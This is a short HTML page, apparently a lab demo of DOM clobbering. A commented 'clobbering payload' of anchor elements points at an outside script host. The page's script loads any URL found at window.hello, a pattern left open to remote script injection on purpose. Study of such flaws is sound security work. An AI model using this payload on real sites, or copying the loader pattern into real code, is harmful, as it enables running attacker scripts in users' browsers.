<!DOCTYPE html>
<html>
<head>
    <title>Submit Name to Anchor</title>
</head>
<body>
    /////clobbering payload/////
<!--     <a id="hello"><\a>
    <a id="hello" name=url href="https://gaeunbae.github.io/hello.js"></a> -->
    ///////////////////////////








    <form id="script-form">
        <button type="button" onclick="makeScript()">Make Script!</button>
    </form>    
    <script>
        function makeScript(){
            window.hello = {
                url: "https://example.com/script.js" // Replace with the actual URL of the script you want to load
            };
        }
        let someObject = window.hello || {};
        if (someObject.url) {
            let script = document.createElement('script');
            script.setAttribute('src', someObject.url);
            script.src = someObject.url;
            console.log(someObject.url);
            document.body.appendChild(script);
        }
        
    </script>
</body>
</html>
